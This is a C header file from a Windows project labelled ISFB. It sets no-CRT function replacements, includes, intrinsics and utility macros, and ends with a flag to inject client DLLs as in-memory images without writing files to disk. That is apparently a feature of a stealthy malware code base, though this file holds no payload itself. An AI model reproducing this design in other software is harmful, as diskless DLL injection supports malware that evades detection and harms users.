//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: main.h
// $Revision: 429 $
// $Date: 2014-12-04 18:10:13 +0300 (Чт, 04 дек 2014) $
// description:
//	ISFB main includes, constants and definations.

#pragma once

#define	_ISFB			TRUE
#define	_NO_CRT			TRUE

#ifndef WINVER				// Allow use of features specific to Windows XP or later.
#define WINVER 0x0501		// Change this to the appropriate value to target other versions of Windows.
#endif

#ifndef _WIN32_WINNT		// Allow use of features specific to Windows XP or later.                   
#define _WIN32_WINNT 0x0501	// Change this to the appropriate value to target other versions of Windows.
#endif						

#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers

#include <stdio.h>
#include <windows.h>
#include <Sddl.h>

#include <tchar.h>
#include <psapi.h>
#include <wininet.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <winsock2.h>
//#include <inaddr.h>
//#include <in6addr.h>


#ifdef _NO_CRT
	#undef strlen
	#undef _stricmp
	#undef _mbsicmp
	#undef strscmp
	#undef wcscmp
	#undef wsclen
	#undef malloc
	#undef free
	#undef strupr
	#undef wcsupr
	#undef _mbsupr
	#undef strtoul
	#undef strcat
	#undef wcscat

	#undef _tcsrchr
	#undef strchr
	#undef wcschr
	#undef strrchr
	#undef wcsrchr
	#undef _tcsicmp
	#undef srand
	#undef rand
	#undef time
  
	#define srand _srand
	#define rand  _rand

	#define strlen		lstrlenA
	#define wcslen		lstrlenW
	#define strcmp		lstrcmpA
	#define wcscmp		lstrcmpW
	#define _stricmp	lstrcmpiA
	#define _tcsicmp	lstrcmpiA
	#define	_mbsicmp	lstrcmpiA
	#define strcat		lstrcatA
	#define wcscat		lstrcatW

	#define malloc(x)		LocalAlloc(LPTR, x)
	#define free(x)			LocalFree(x)
	#define	realloc(x, y)	LocalReAlloc(x, y, LMEM_MOVEABLE)

	#define strupr	_strupr	// ndll
	#define wcsupr	_wcsupr	//
	#define	_mbsupr	_strupr //


	#define strtoul(a,b,c)	StrToIntA(a)
	#define wcstoul(a,b,c)	StrToIntW(a)
	#define strchr			StrChrA
	#define wcschr			StrChrW
	#define strrchr(a,b)	StrRChrA(a, NULL, b)
	#define wcsrchr(a,b)	StrRChrW(a, NULL, b)
	#define _tcsrchr(a,b)	StrRChr(a, NULL, b)
#endif



#ifndef NTSTATUS
#define NTSTATUS LONG
#endif

#pragma warning(push)
#pragma warning(disable:4005) // macro redefinition
#include "..\ntdll.h"
#include <ntstatus.h>
#pragma warning(pop)


#pragma warning (disable:4996)	// 'wcscpy': This function or variable may be unsafe. Consider using wcscpy_s instead.

// Interlocked intrinsics
#ifdef __cplusplus
 extern "C" {
#endif
	extern LONG  __cdecl _InterlockedIncrement(LONG volatile *Addend);
	extern LONG  __cdecl _InterlockedDecrement(LONG volatile *Addend);
	extern LONG  __cdecl _InterlockedAnd(LONG volatile *Destination, LONG Value);
	extern LONG  __cdecl _InterlockedOr(LONG volatile *Destination, LONG Value);
#ifdef __cplusplus
 }
#endif


#pragma intrinsic(_InterlockedIncrement)
#pragma intrinsic(_InterlockedDecrement)
#pragma intrinsic(_InterlockedAnd)
#pragma intrinsic(_InterlockedOr)
#pragma intrinsic(_byteswap_ushort)
#pragma intrinsic(_byteswap_ulong)


// DbgPrint() and checked heap allocations
#include "dbg.h"

// Lists support 
#include "listsup.h"

// Memory allcoators
#include "memalloc.h"

// Usefull types
typedef INT	WINERROR;					// One of the Windows error codes defined within winerror.h
#define ERROR_UNSUCCESSFULL	0xffffffff	// Common unsuccessfull code
#define	INVALID_INDEX		(-1)

// Macros
#define MAX_PATH_BYTES		(MAX_PATH*sizeof(_TCHAR))

#define cstrlenW(str)		(sizeof(str)-1)/sizeof(WCHAR)
#define cstrlenA(str)		(sizeof(str)-1)

// constant string length
#if _UNICODE
//C_ASSERT(FALSE);
	#define cstrlen(str)	cstrlenW(str)
#else
	#define cstrlen(str)	cstrlenA(str)
#endif

// maximum number of symbols required to represent ULONG_MAX constant
#define	ULONG_MAX_LEN		10

// minimum buffer size
#define BUFFER_INCREMENT	0x1000

#define szSpace				_T(" ")

#define	htonS(x)			_byteswap_ushort(x)
#define	htonL(x)			_byteswap_ulong(x)

//#define	htonS(x)			((LOBYTE(x) << 8) + HIBYTE(x))
//#define	htonL(x)			((LOBYTE(LOWORD(x)) << 24) + (HIBYTE(LOWORD(x)) << 16) + (LOBYTE(HIWORD(x)) << 8) + HIBYTE(HIWORD(x)))

// Inject client DLLs as images without creating files on a disk.
#define	_INJECT_AS_IMAGE	TRUE
